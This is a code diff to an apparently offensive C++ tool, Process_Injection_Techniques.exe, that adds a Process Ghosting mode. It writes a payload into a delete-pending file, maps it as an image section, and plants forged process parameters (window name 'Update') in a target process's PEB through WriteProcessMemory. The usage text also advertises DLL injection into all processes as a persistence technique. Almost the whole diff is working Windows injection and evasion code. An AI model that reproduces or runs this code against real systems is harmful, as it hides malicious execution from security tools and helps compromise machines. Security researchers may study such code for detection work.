@@ -38,10 +38,16 @@ PLOADED_IMAGE  GetLoadedImage(DWORD64 dwImageBase);
 char* GetDLLName(DWORD64 dwImageBase, IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor);
 IMAGE_DATA_DIRECTORY  GetImportDirectory(PIMAGE_NT_HEADERS pFileHeader);
 PIMAGE_IMPORT_DESCRIPTOR  GetImportDescriptors(PIMAGE_NT_HEADERS pFileHeader, IMAGE_DATA_DIRECTORY ImportDirectory);
-
 DWORD64  FindRemotePEB(HANDLE hProcess);
-PEBmy* ReadRemotePEB(HANDLE hProcess);
+PEBmy*  ReadRemotePEB(HANDLE hProcess);
 PLOADED_IMAGE  ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress);
+WORD GetPEFileArchitecture(BYTE* dwImageBase);
+DWORD GetEntryPointRVA(BYTE* dwImageBase);
+HANDLE GetSectionHandleFromFileThenDeleteFileOnClose(WCHAR* filePath, BYTE* payladBuf, DWORD payloadSize);
+BOOL SetProcessParametar(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, LPWSTR targetPath);
+LPVOID WriteParameterinProcess(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERSMy params, DWORD protect);
+BOOL SetPEBparameter(PVOID ParametarBase, HANDLE hProcess, PROCESS_BASIC_INFORMATION& pbi);
+
 
 
 void PrintUsage() {
@@ -86,6 +92,9 @@ void PrintUsage() {
     printf("Inject Dll in All process that Calls (CreateProcess*, WinExe,..) and can prevent process from creation by return Error Code, Will Work also as persistence technique\n");
     printf("Note:The Dll Must Export CreateProcessNotify(LPCWSTR lpApplicationName, REASON enReason) as this function will be called, See Refrence[1] in the README\n");
     printf("Process_Injection_Techniques.exe 11 -d <DLL Full Path>\n\n");
+
+    printf("inject process inside other process using Process Ghosting\n");
+    printf("Process_Injection_Techniques.exe 12 -n <Target Executable> -d <your payload path>\n\n");
 
 
 }
@@ -182,6 +191,13 @@ void ParseCommandLineArgument(int argc, WCHAR* argv[]) {
         wcscpy(DLLPath, argv[index]);
         break;
 
+    case 12:
+        index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
+        wcscpy(ProcessName, argv[index]);
+        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
+        wcscpy(SourceProcessName, argv[index]);
+        break;
+
     default:
         PrintUsage();
         exit(0);
@@ -231,7 +247,6 @@ DWORD GetProcessIDFromName(WCHAR* ProcName) {
     return PID;
 }
 
-
 BYTE* ReadDataFromFile(WCHAR* FileName) {
 
     HANDLE hFile = NULL; 
@@ -260,9 +275,22 @@ BYTE* ReadDataFromFile(WCHAR* FileName) {
         return NULL;
     }
 
+    CloseHandle(hFile);
     return FileContents;
 }
 
+DWORD GetSizeOfFile(WCHAR *FileName) {
+    HANDLE hFile = CreateFile(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    DWORD FileSize = GetFileSize(hFile, 0);
+    if (FileSize == INVALID_FILE_SIZE) {
+        printf("Failed To get File size Error Code is 0x%x\n", GetLastError());
+        return NULL;
+    }
+
+    CloseHandle(hFile);
+    return FileSize;
+}
 
 BOOL StartExecutable(WCHAR* ExecutablePath, PROCESS_INFO* ProcessInfo,DWORD CreationFlag) {
     STARTUPINFO si = { 0 };
@@ -286,7 +314,6 @@ BOOL StartExecutable(WCHAR* ExecutablePath, PROCESS_INFO* ProcessInfo,DWORD Crea
 void ResumeProcess(HANDLE hThread) {
     ResumeThread(hThread);
 }
-
 
 void GetMainModuleInfo(DWORD PID, MODULE_INFO* ProcessInfo)
 {
@@ -319,7 +346,6 @@ void GetMainModuleInfo(DWORD PID, MODULE_INFO* ProcessInfo)
     return ;
 
 }
-
 
 int ChangeTheTLSCallBackFunctionInRemoteProcess(DWORD PID, MODULE_INFO* ModuleInfo,BYTE* ShellCode) {
 
@@ -396,8 +422,6 @@ int ChangeTheTLSCallBackFunctionInRemoteProcess(DWORD PID, MODULE_INFO* ModuleIn
     return 0;
 }
 
-
-
 PIMAGE_NT_HEADERS  GetNTHeaders(DWORD64 dwImageBase) {
     return (PIMAGE_NT_HEADERS)(dwImageBase + ((PIMAGE_DOS_HEADER)dwImageBase)->e_lfanew);
 }
@@ -434,7 +458,7 @@ PIMAGE_IMPORT_DESCRIPTOR  GetImportDescriptors(PIMAGE_NT_HEADERS pFileHeader, IM
         ImportDirectory.VirtualAddress);
 }
 
-DWORD64  FindRemotePEB(HANDLE hProcess)
+DWORD64 FindRemotePEB(HANDLE hProcess)
 {
     HMODULE hNTDLL = LoadLibraryA("ntdll");
 
@@ -450,12 +474,11 @@ DWORD64  FindRemotePEB(HANDLE hProcess)
         return -1;
     }
 
-
     _NtQueryInformationProcess ntQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
 
     PROCESS_BASIC_INFORMATION* pBasicInfo = new PROCESS_BASIC_INFORMATION();
 
-    DWORD64 dwReturnLength = 0;
+    DWORD dwReturnLength = 0;
 
     ntQueryInformationProcess(hProcess, 0, pBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &dwReturnLength);
 
@@ -468,8 +491,8 @@ PEBmy* ReadRemotePEB(HANDLE hProcess)
 
     PEBmy* pPEB = new PEBmy();
     size_t written = 0;
-    BOOL bSuccess = ReadProcessMemory(hProcess, (LPCVOID)dwPEBAddress, pPEB, sizeof(PEBmy), NULL);
 
+    BOOL bSuccess = ReadProcessMemory(hProcess, (LPCVOID)dwPEBAddress, (LPVOID)pPEB, sizeof(PEBmy), NULL);
     if (!bSuccess) {
         printf("Error Read Process mmory Error Code 0x%x\n", GetLastError());
         return NULL;
@@ -499,4 +522,258 @@ PLOADED_IMAGE  ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress)
     pImage->Sections = (PIMAGE_SECTION_HEADER)(lpBuffer + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
 
     return pImage;
+}
+
+WORD GetPEFileArchitecture(BYTE* dwImageBase) {
+    void* ptr = GetNTHeaders((DWORD64)dwImageBase);
+    if (ptr == NULL) return 0;
+
+    IMAGE_NT_HEADERS32* inh = static_cast<IMAGE_NT_HEADERS32*>(ptr);
+    return inh->FileHeader.Machine;
+}
+
+DWORD GetEntryPointRVA(BYTE* dwImageBase) {
+
+    WORD PEArch = GetPEFileArchitecture(dwImageBase);
+    PIMAGE_NT_HEADERS pSourceHeaders = GetNTHeaders((DWORD64)dwImageBase);
+    if (pSourceHeaders == NULL) {
+        return 0;
+    }
+    DWORD EntryPointRVA = 0;
+
+    if (PEArch == IMAGE_FILE_MACHINE_AMD64) {
+        IMAGE_NT_HEADERS64* PayLoadNTheader64 = (IMAGE_NT_HEADERS64*)pSourceHeaders;
+        EntryPointRVA = PayLoadNTheader64->OptionalHeader.AddressOfEntryPoint;
+    }
+    else {
+        IMAGE_NT_HEADERS32* PayLoadNTheader32 = (IMAGE_NT_HEADERS32*)pSourceHeaders;
+        EntryPointRVA = static_cast<ULONGLONG>(PayLoadNTheader32->OptionalHeader.AddressOfEntryPoint);
+    }
+    return EntryPointRVA;
+}
+
+HANDLE OpenFileNtdll(WCHAR* FilePath)
+{
+    // convert to NT path
+    std::wstring NtPath = L"\\??\\" + std::wstring(FilePath);
+
+    UNICODE_STRING FileName = { 0 };
+    RtlInitUnicodeString(&FileName, NtPath.c_str());
+
+    OBJECT_ATTRIBUTES attr = { 0 };
+    InitializeObjectAttributes(&attr, &FileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    IO_STATUS_BLOCK StatusBlock = { 0 };
+    HANDLE hFile = INVALID_HANDLE_VALUE;
+    NTSTATUS stat = NtOpenFile(&hFile, DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
+        &attr, &StatusBlock,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
+    );
+    if (!NT_SUCCESS(stat)) {
+        printf("Failed To Create Target File Eror Code is %x\n", GetLastError());
+        return INVALID_HANDLE_VALUE;
+    }
+
+    return hFile;
+}
+
+HANDLE GetSectionHandleFromFileThenDeleteFileOnClose(WCHAR* filePath, BYTE* payladBuf, DWORD payloadSize)
+{
+    HMODULE hNTDLL = GetModuleHandleA("ntdll");
+    _NtSetInformationFile fnNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(hNTDLL, "NtSetInformationFile");
+    _NtWriteFile fnNtWriteFile = (_NtWriteFile)GetProcAddress(hNTDLL, "NtWriteFile");
+    _NtCreateSection fnNtCreateSection = (_NtCreateSection)GetProcAddress(hNTDLL, "NtCreateSection");
+    _NtClose fnNtClose = (_NtClose)GetProcAddress(hNTDLL, "NtClose");
+
+    HANDLE hDelFile = OpenFileNtdll(filePath);
+    if (!hDelFile || hDelFile == INVALID_HANDLE_VALUE) {
+        return INVALID_HANDLE_VALUE;
+    }
+    NTSTATUS status = 0;
+    IO_STATUS_BLOCK StatusBlock = { 0 };
+
+    /* Set disposition flag */
+    FILE_DISPOSITION_INFORMATION info = { 0 };
+    info.DeleteFile = TRUE;
+
+    status = fnNtSetInformationFile(hDelFile, &StatusBlock, &info, sizeof(info), FILE_INFORMATION_CLASS(13));//FileDispositionInformation
+    if (!NT_SUCCESS(status)) {
+        printf("Failed to Setting information  Erro Code 0x%x\n", GetLastError());
+        return INVALID_HANDLE_VALUE;
+    }
+
+    LARGE_INTEGER ByteOffset = { 0 };
+
+    status = fnNtWriteFile(hDelFile, NULL, NULL, NULL, &StatusBlock, payladBuf, payloadSize, &ByteOffset, NULL);
+    if (!NT_SUCCESS(status)) {
+        printf("Failed to Write Data To File Erro Code 0x%x\n", GetLastError());
+        return INVALID_HANDLE_VALUE;
+    }
+
+    HANDLE hSection = nullptr;
+    status = fnNtCreateSection(&hSection,SECTION_ALL_ACCESS,NULL, 0, PAGE_READONLY, SEC_IMAGE, hDelFile);
+    if (status != 0) {
+        printf("Failed to Create Section Erro Code 0x%x\n", GetLastError());
+        return INVALID_HANDLE_VALUE;
+    }
+
+    fnNtClose(hDelFile);
+    hDelFile = nullptr;
+
+    return hSection;
+}
+
+
+WCHAR* GetFileNameFromPath(WCHAR* FullPath)
+{
+    size_t len = wcslen(FullPath);
+    for (size_t i = len - 2; i >= 0; i--) {
+        if (FullPath[i] == '\\' || FullPath[i] == '/') {
+            return FullPath + (i + 1);
+        }
+    }
+    return FullPath;
+}
+
+WCHAR* GetDirectoryFromPath(WCHAR* FullPath, WCHAR* OutBuffer, const DWORD64 OutBufferSize)
+{
+    memset(OutBuffer, 0, OutBufferSize);
+    memcpy(OutBuffer, FullPath, OutBufferSize);
+
+    wchar_t* name_ptr = GetFileNameFromPath(OutBuffer);
+    if (name_ptr != nullptr) {
+        *name_ptr = '\0'; //cut it
+    }
+    return OutBuffer;
+}
+
+BOOL SetProcessParametar(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, LPWSTR targetPath)
+{
+    HMODULE hNTDLL = GetModuleHandleA("ntdll");
+    _RtlCreateProcessParametersEx fnRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(hNTDLL, "RtlCreateProcessParametersEx");
+
+    
+    UNICODE_STRING uTargetPath = { 0 };
+    RtlInitUnicodeString(&uTargetPath, targetPath);
+    
+    WCHAR DirPath[MAX_PATH] = { 0 };
+    GetDirectoryFromPath(targetPath, DirPath, MAX_PATH);
+    //if the directory is empty, set the current one
+    if (wcsnlen(DirPath, MAX_PATH) == 0) {
+        GetCurrentDirectoryW(MAX_PATH, DirPath);
+    }
+    UNICODE_STRING uCurrentDir = { 0 };
+    RtlInitUnicodeString(&uCurrentDir, DirPath);
+
+    WCHAR dllDir[] = L"C:\\Windows\\System32";
+    UNICODE_STRING uDllDir = { 0 };
+    RtlInitUnicodeString(&uDllDir, dllDir);
+    
+    UNICODE_STRING uWindowName = { 0 };
+    WCHAR windowName[] = L"Update";
+    RtlInitUnicodeString(&uWindowName, windowName);
+
+    LPVOID Environment;
+    CreateEnvironmentBlock(&Environment, NULL, TRUE);
+
+    PRTL_USER_PROCESS_PARAMETERSMy params = nullptr;
+    NTSTATUS status = fnRtlCreateProcessParametersEx(&params, (PUNICODE_STRING)&uTargetPath, (PUNICODE_STRING)&uDllDir, (PUNICODE_STRING)&uCurrentDir, (PUNICODE_STRING)&uTargetPath, Environment,
+                                                    (PUNICODE_STRING)&uWindowName, nullptr, nullptr, nullptr, RTL_USER_PROC_PARAMS_NORMALIZED);
+
+    if (status != 0) {
+        printf("failed RtlCreateProcessParametersEx Error Code 0x%x\n", GetLastError());
+        return -1;
+    }
+
+    LPVOID RemoteParametar = WriteParameterinProcess(hProcess, params, PAGE_READWRITE);
+    if (!RemoteParametar) {
+        printf("failed Cannot make a remote copy of parameters Error Code 0x%x\n", GetLastError());
+        return -1;
+    }
+
+    PEBmy* PebCopy = ReadRemotePEB(hProcess);
+
+    if (!SetPEBparameter(RemoteParametar, hProcess, pi)) {
+        printf("failed Cannot update Remote PEB Error Code 0x%x\n", GetLastError());
+        return -1;
+    }
+
+    return 0;
+}
+
+LPVOID WriteParameterinProcess(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERSMy params, DWORD protect)
+{
+    if (params == NULL) return NULL;
+
+    PVOID buffer = params;
+    ULONG_PTR buffer_end = (ULONG_PTR)params + params->Length;
+
+    //params and environment in one space:
+    if (params->Environment) {
+        if ((ULONG_PTR)params > (ULONG_PTR)params->Environment) {
+            buffer = (PVOID)params->Environment;
+        }
+        ULONG_PTR env_end = (ULONG_PTR)params->Environment + params->EnvironmentSize;
+        if (env_end > buffer_end) {
+            buffer_end = env_end;
+        }
+    }
+    // copy the continuous area containing parameters + environment
+    SIZE_T buffer_size = buffer_end - (ULONG_PTR)buffer;
+    if (VirtualAllocEx(hProcess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
+        if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, NULL)) {
+            printf("failed Writing RemoteProcessParams Error Code 0x%x\n", GetLastError());
+            return nullptr;
+        }
+        if (params->Environment) {
+            if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL)) {
+                printf("failed Writing environment Error Code 0x%x\n", GetLastError());
+                return nullptr;
+            }
+        }
+        return (LPVOID)params;
+    }
+
+    // could not copy the continuous space, try to fill it as separate chunks:
+    if (!VirtualAllocEx(hProcess, (LPVOID)params, params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
+        printf("failed Allocating RemoteProcessParams failed Error Code 0x%x\n", GetLastError());
+        return nullptr;
+    }
+    if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, NULL)) {
+        printf("failed Writing RemoteProcessParams Error Code 0x%x\n", GetLastError());
+        return nullptr;
+    }
+    if (params->Environment) {
+        if (!VirtualAllocEx(hProcess, (LPVOID)params->Environment, params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
+            printf("failed Allocating environment Error Code 0x%x\n", GetLastError());
+            return nullptr;
+        }
+        if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL)) {
+            printf("failed Writing environment Error Code 0x%x\n", GetLastError());
+            return nullptr;
+        }
+    }
+    return (LPVOID)params;
+}
+
+BOOL SetPEBparameter(PVOID ParametarBase, HANDLE hProcess, PROCESS_BASIC_INFORMATION& pbi)
+{
+    ULONGLONG RemotePEBAddress = (ULONGLONG)pbi.PebBaseAddress;
+    if (!RemotePEBAddress) {
+        printf("failed getting remote PEB address Error Code 0x%x\n", GetLastError());
+        return false;
+    }
+    PEB PEBCopy = { 0 };
+    ULONGLONG offset = (ULONGLONG)&PEBCopy.ProcessParameters - (ULONGLONG)&PEBCopy;
+
+    LPVOID RemoteImaegBase = (LPVOID)(RemotePEBAddress + offset);
+
+    SIZE_T written = 0;
+    if (!WriteProcessMemory(hProcess, RemoteImaegBase, &ParametarBase, sizeof(PVOID), &written)) {
+        printf("failed Cannot update Params Error Code 0x%x\n", GetLastError());
+        return false;
+    }
+
+    return true;
 }
